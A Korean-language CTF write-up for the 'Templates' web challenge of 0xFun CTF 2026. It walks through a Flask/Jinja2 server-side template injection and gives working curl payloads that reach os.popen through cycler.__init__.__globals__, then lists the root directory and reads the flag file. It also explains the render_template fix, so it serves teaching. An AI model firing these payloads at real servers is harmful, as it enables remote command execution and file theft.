---
title: "[Web] Templates"
description: Writeup for "Templates" from 0xFun CTF 2026.
date: 2026-02-15 01:00:00 +0900
categories: [CTF, 0xFun CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Templates (0xFun CTF 2026)

---

- **Name:** Templates
- **Category:** Web
- **Connection:** `http://chall.0xfun.org:49811`
- **Flag format:** `0xfun{...}`

---

### 개요

이름을 입력하면 인사말을 렌더링해주는 간단한 서비스입니다.
`POST /`에 `name` 파라미터를 보내면 응답 HTML에 그대로 반영됩니다.

응답 헤더를 보면 단서가 보입니다.

```
Server: Werkzeug/2.3.7 Python/3.11.14
```

Flask + Jinja2 조합입니다.
입력이 HTML에 반영된다면, Jinja2 표현식이 평가되는지 바로 확인해볼 수 있습니다.

```bash
curl -s -X POST "http://chall.0xfun.org:49811/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{ 7*7 }}"
```

응답에 `49`가 나타납니다. SSTI 확인입니다.

---

### 소스 분석

#### 안전한 코드 vs 취약한 코드

Flask에서 템플릿을 렌더링하는 방법은 두 가지입니다.

```python
# 안전: 사용자 입력은 데이터로만 전달
render_template("index.html", name=user_input)

# 취약: 사용자 입력이 템플릿 자체로 컴파일됨
render_template_string(user_input)
```

`render_template()`은 고정된 템플릿 파일에 값을 채워 넣는 방식입니다.
사용자 입력은 `{{ name }}`이 참조하는 데이터일 뿐, 템플릿 문법으로 해석되지 않습니다.

`render_template_string()`은 넘겨받은 문자열 자체를 템플릿으로 컴파일합니다.
사용자 입력이 그대로 들어오면, `{{ ... }}` 안의 모든 표현식이 서버에서 실행됩니다.

이 서비스는 후자를 사용하고 있습니다.

---

### 취약점 분석

Jinja2 SSTI에서 RCE까지 도달하려면 파이썬 내부에 접근할 방법이 필요합니다.

Jinja2에는 기본 내장 객체들이 있고, 그 중 `cycler`를 활용합니다.

```
cycler.__init__                  → cycler 클래스의 생성자 함수
cycler.__init__.__globals__      → 그 함수의 전역 변수 딕셔너리
cycler.__init__.__globals__.os   → os 모듈이 포함되어 있음
os.popen("cmd").read()           → 셸 명령 실행 및 출력 반환
```

파이썬에서 함수의 `__globals__`는 그 함수가 정의된 모듈의 전역 네임스페이스입니다.
`cycler.__init__`이 정의된 환경에는 `os`가 임포트되어 있고,
이를 통해 셸 명령을 실행할 수 있습니다.

페이로드를 하나의 표현식으로 연결하면 이렇게 됩니다.

```
{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}
```

Jinja2가 이 표현식을 평가하면서 `os.popen()`이 실행되고,
출력 결과가 HTML에 그대로 렌더링됩니다.

---

### Exploit 실행 과정

**Step 1 — RCE 확인**

```bash
curl -s -X POST "http://chall.0xfun.org:49811/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('ls -al /').read()}}"
```

루트 디렉터리 목록이 응답에 출력되면 RCE가 동작하는 것입니다.

**Step 2 — 플래그 읽기**

```bash
curl -s -X POST "http://chall.0xfun.org:49811/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
```

실행 결과:

```
0xfun{Server_Side_Template_Injection_Awesome}
```

---

### FLAG

```
0xfun{Server_Side_Template_Injection_Awesome}
```

---

### 요약

`render_template_string()`에 사용자 입력을 그대로 넘기면,
입력이 데이터가 아닌 **실행 가능한 템플릿 코드**가 됩니다.

`cycler.__init__.__globals__.os`를 통해 파이썬 `os` 모듈에 접근하고,
`os.popen()`으로 임의 셸 명령을 실행할 수 있습니다.

수정 방법은 단순합니다.
템플릿은 파일로 고정하고(`render_template`),
사용자 입력은 반드시 데이터로만 전달해야 합니다.
